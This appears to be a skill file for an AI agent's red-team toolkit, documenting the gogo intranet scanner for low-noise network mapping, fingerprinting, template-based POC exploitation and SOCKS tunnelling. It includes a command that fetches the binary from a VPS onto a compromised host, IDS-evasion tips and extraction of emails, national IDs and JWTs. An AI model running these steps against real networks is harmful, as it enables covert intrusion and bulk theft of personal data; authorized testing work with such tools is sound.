---
name: gogo-intranet
description: [Internal] gogo v2.15.0 high-performance intranet scanning engine: smart/supersmart modes, active + passive fingerprinting, key information extraction (title/cert/JWT/email/national ID), nuclei template POCs, controllable low-noise packet sending
whenToUse: After entering an intranet, to map large netblocks (/16 /12) fast, obtain fingerprints and key information, and send as few packets as possible without being noticed
role: internal
category: Internal
tags: [internal, scan, fingerprint]
enabled: true
---

# gogo (intranet mapping and fingerprint engine)

> Scanning intranet netblocks will show other organisations/adjacent sites: only carry out follow-on attacks against **T0/T1**; T2 needs user confirmation, T3 is not touched.

`gogo` = a **high-concurrency, low-noise, highly configurable mapping engine**. Produced by Chain Reactor, designed for red team intranet scenarios:
minimum-packet principle, active + passive fingerprinting, key information extraction, kernel-level POC engine (neutron, compatible with nuclei templates),
DSL/workflow customization. **Map the surface with gogo first, then hit entry points with fscan.**

## Division of labour with fscan

| | gogo | fscan |
| --- | --- | --- |
| Strengths | Large netblock mapping, fingerprints, information extraction, controllable packet sending | Weak-password brute force, unauthorized access, high-risk vulnerabilities, exploitation |
| Default noise | Low (`--opsec`, tunable threads/timeouts) | High (600 threads + brute force + all POCs enabled) |
| Output | `.dat` (deflate JSON Lines) + formatted | txt/json/csv |
| Typical usage | `gogo -i 10.0.0.0/8 -m ss --ping -p top2,win,db --af` | `fscan -h 10.0.0.0/24 -nobr -nopoc` |

## Binaries

```
Local : $DSH_HOME/redteam/toolkit/gogo/gogo                (v2.15.0, 4.3MB, 3138 built-in fingerprints)
        $DSH_HOME/redteam/toolkit/gogo/gogo_windows_amd64.exe
        $DSH_HOME/redteam/toolkit/gogo/gogo_linux_arm64
VPS   : http://<your-VPS-IP>:9100/gogo                      (payload directory of the vps-reverse-shell skill)

# Run it on a jump host/target
curl -o gogo http://<your-VPS-IP>:9100/gogo && chmod +x gogo
```

**Zero dependencies**: a single static binary with all fingerprints and extraction rules built in; even Windows 2003 can run it. **No** extra configuration file is needed.

## Discipline

1. **Scope**: use `--exclude` / `--exclude-file` to exclude netblocks outside the authorized scope; do not sweep the office network and cloud metadata ranges.
2. **Recon the path before scanning**: `ip a; ip route; arp -a; cat /etc/hosts` — intranet topology often saves you half the scanning.
3. **OPSEC**: add `--opsec` in sensitive environments, push threads down to `-t 200~500`, timeout `-d 3`; large netblocks must use `--ping` for pre-filtering.
4. **Do not use `-p -` (all ports) on large netblocks** — that is suicidal packet sending; use `top2` first, then full ports against live hosts only.

## Core concepts

### Port presets (the soul of this tool)

```bash
gogo -P port        # list all preset tags and their ports
```

Common tags: `top1`(80,443,8080) · `top2`(hundreds of common Web/service ports) · `top3` · `common`(common intranet) ·
`win`(135,137,445,3389,winrm,oxid) · `db` · `http` · `docker` · `oracle` · `smb` · `all`(full set)

```bash
p combination: -p top2,win,db          # any comma combination
p range:       -p 1-1000               # interval
p all:         -p -                    # equals 1-65535 (use with care)
p single:      -p 6379,mysql,12345
```

### Three scanning modes

| Mode | Flag | Suitable for |
| --- | --- | --- |
| default | (default) | Single IP / small netblock (within /24) |
| smart | `-m s` | /24~/16, A/B segment probing + heuristic branching |
| supersmart | `-m ss` | Large intranets of /16 or above, probe points first then filter netblocks |
| sc | `-m sc` | Known target segment, finer port coverage needed |

```bash
gogo -i 192.168.1.0/24 -m s  --ping -p top2,win,db --af
gogo -i 10.0.0.0/8    -m ss --ping -p top2,win,db --af
```

### workflow (save complex commands as presets)

```bash
gogo -P workflow     # list all workflows
gogo -w 10           # equivalent to the supersmart full flow for 10.0.0.0/8 (all ports)
gogo -w 172          # 172.16.0.0/12
gogo -w 192          # 192.168.0.0/16
gogo -w interc       # common intranet C segments (10/172/192)
gogo -w 10 -i 11.0.0.0/8 -p top2   # the command line can override workflow parameters
```

## Parameter reference (verified against v2.15.0 `-h`)

> **Multi-character long flags require double dashes**: `--ipp`, `--sp`, `--ef`, `--af`. Single dashes are only for single characters such as `-i/-p/-m/-t/-d/-e/-v/-w/-F/-l/-L/-j`.

**Input**
```
-i/--ip   192.168.1.1/24,172.16.1.1/24   targets, comma-separated
--exclude 10.0.0.1/24        --exclude-file <file>
-l <file> target list file        -L  read targets from stdin
-j <file> reuse previous results (.dat) or an ip:port list, and keep digging     -J  read from stdin
```

**Output**
```
-f <file>        output file name         --path  output directory
-o <fmt>         console output format     -O <fmt>  file output format (default jsonlines)
--af             auto-name the output file (.dat, deflate JSON Lines)
--hf             auto-name the hidden file   -C  disable compression      --tee  keep console output as well
-q/--quiet       log off, results only (always add when chaining with other tools)
-F <file>        format an existing .dat result
--filter / --output-filter / --scan-filter   historical filter / live filter / early stop
```

**Smart scanning**
```
-m/--mod  default|s|ss|sc    scanning mode
--ping                       ICMP pre-filter (mandatory for large netblocks)
-n/--no                      smart scan only, do not enter the default scan
--sp   smart port probe (default 80, default icmp in ss mode)
--ipp  A/B segment IP probe (default 1,254)
```

**Performance and stealth**
```
-t/--thread <n>     concurrency (linux default 4000, 200~1000 recommended on intranets)
-d/--timeout <sec>  timeout (default 2)
-D/--ssl-timeout    SSL timeout
--opsec             low-noise mode (enable in sensitive environments)
-s/--spray          port-first spraying (auto-enabled when port count >500)
--no-spray          force spraying off
```

**Fingerprints and extraction**
```
-v/--verbose         active fingerprinting (without it only passive fingerprints — less information but quieter)
--ff <file>          custom fingerprint library
--extract "<regex>"  custom extraction regex
gogo -P extract      view built-in extraction rules (jwt / mail / idcard / phone / ip etc.)
```

**Vulnerabilities (neutron kernel)**
```
-e/--exploit         enable POC scanning (combined with -v written as -ev)
-E <name>            specify a template name        --ef <file>  specify a template file
--payload <s>        specify a payload      --attack-type sniper|clusterbomb|pitchfork
```

**Proxy**
```
--proxy socks5://127.0.0.1:11111      # verified working; goes through a suo5 / ssh -D tunnel
```

## Standard operating procedure (SOP)

```bash
# 0) Recon the path
ip a; ip route; arp -a; cat /etc/hosts /etc/resolv.conf

# 1) Large netblock mapping (quiet, liveness first, results to file)
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af -t 500 -d 3

# 2) Read the results (human-like)
./gogo -F ./.10.0.0.0_16_top2_win_db_ss_dat

# 3) Full ports + active fingerprints against live hosts
./gogo -i 10.0.1.0/24 -p - -v -t 1000 -d 3 --af

# 4) Targeted POC run (only against targets with confirmed fingerprints)
./gogo -i 10.0.1.5,10.0.1.9 -p top2 -ev -E <template name>

# 5) Reuse the previous step's results to keep digging (no rescan)
./gogo -j ./step1.dat -p 1-65535 -v -e
```

### Mapping through a tunnel (the main intranet penetration path)

```bash
# Prerequisite: a socks5 built by the suo5-tunnel skill, or ssh -D from vps-reverse-shell
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af \
       --proxy socks5://127.0.0.1:1080 -t 300 -d 5 -q

# Verified: gogo --proxy socks5:// genuinely pushes traffic into the tunnel (scanning through the VPS reveals the VPS's SSH fingerprint)
```

In tunnel scenarios lower `-t` below 300 and raise `-d` to 5, otherwise the tunnel drops packets and causes false negatives.

## Persisting results (mandatory)

gogo's `.dat` is compressed JSON Lines; format it before parsing into the store:

```bash
./gogo -F ./result.dat -o json -f result.json      # convert to JSON (verified output structure below)
python3 tools/parse.py result.json
# Parsing notes: the top level is {config, ip, data:[...]}; each entry contains ip/port/protocol/status/frameworks/title/timing
```
```python
import json
d = json.load(open('result.json', encoding='utf-8'))
for it in d.get('data', []):
    fw = ','.join((it.get('frameworks') or {}).keys())
    print(it.get('ip'), it.get('port'), it.get('protocol'), fw, it.get('title'))
# Verified single entry: {"ip":"10.0.0.5","port":"22","protocol":"tcp","status":"open",
#             "frameworks":{"ssh":{"name":"ssh","attributes":{"version":"10.3p1"}}},
#             "title":"SSH-2.0-OpenS","timing":26}
```

```bash
# Persistence discipline (same as fscan)
redteam_asset_add      { engagement, ip, port, service, title, source: "gogo", tags: [...] }
redteam_web_list       # URL/title subsequently filled in by the web fingerprint skill
redteam_vuln_add       { engagement, target, name, severity, evidence_ref }   # evidence is mandatory
```

**Note**: gogo's framework/fingerprint results go into the `fingerprint` field of the `asset`; do not leave them only in the terminal.
Extracted sensitive information (email/national ID/JWT) counts toward the "bulk sensitive information" scoring item — record it with `redteam_vuln_add` +
`redteam_score_hit`, and put the evidence in `runs/`.

## Troubleshooting

| Symptom | Handling |
| --- | --- |
| Parameter errors | Long flags need double dashes (`--af`, not `-af`); `-P` only accepts `port/workflow/neutron/extract` |
| Result file not found | `--af` writes into the **binary's own directory**; add `--path` to specify a directory |
| Almost no results on a large netblock | `--ping` misses hosts that block ping; remove `--ping` or adjust probes with `--ipp` |
| Scanning too slow | Raise `-t`, lower `-d`; switch `-p` to `top1`/`top2`; use `-m ss` for large netblocks |
| Detected by IDS | `--opsec` + `-t 200` + `-d 3`; do not enable `-e`; do not use `-p -` |
| Many timeouts through a tunnel | Lower `-t`, raise `-d`; tunnel bandwidth is the bottleneck |
| Want results without logs | `-q` (always add when chaining with other tools) |

## Related skills

- `fscan-intranet`: brute force and exploitation after the surface is mapped
- `suo5-tunnel`: WebShell → SOCKS5, providing the `--proxy` entry for gogo
- `vps-reverse-shell`: tunnels and payload delivery
- `web-fingerprint` / `asset-correlation`: turn gogo's results into an asset graph
